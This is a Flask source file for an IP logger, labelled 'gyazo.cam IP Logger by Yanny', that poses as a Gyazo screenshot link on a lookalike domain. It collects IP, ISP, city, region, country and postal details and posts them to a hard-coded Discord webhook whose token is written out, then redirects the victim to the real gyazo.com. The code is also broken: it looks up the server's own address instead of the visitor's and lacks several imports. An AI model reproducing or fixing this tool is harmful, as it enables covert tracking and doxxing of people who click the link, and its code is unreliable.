from flask import Flask,render_template

app=Flask(__name__)

@app.route("/")
def home():
    return render_template('index.html')

@app.route("/<link>")
def link(link):
	ipreq = requests.get(f"https://ipinfo.io/json")
	data = ipreq.json()
	IPz = data["ip"]
	isp = data["org"]
	city = data["city"]
	reg = data["region"]
	country = data["country"]
	postal = data["postal"]

	hook = Webhook("https://discord.com/api/webhooks/809059659704827959/XwnODZPjvSnQMlFpY0oTKwuQbiTeDcbW8ys5b1ZaGWSNT6C5rhmtHpDGt-wdAm6B5m-k")

	embed = Embed(
		color=0xFF0000
		)
	embed.add_field(name="gyazo.cam", value= "" + "\n" + f"URL: `{link}`" + "\n" + "" + "\n" + f"IP: `{IPz}`" + "\n" + f"ISP: `{isp}`" + "\n" + f"City: `{city}`" + "\n" + f"Region: `{reg}`" + "\n" + f"Country: `{country}`"+ "\n" + f"Postal: `{postal}`")
	embed.set_footer(text="gyazo.cam IP Logger by Yanny")

	hook.send(embed=embed)
	return redirect(f"https://gyazo.com/{link}")


if __name__ == "__main__":
    app.run(debug=False,host='0.0.0.0')
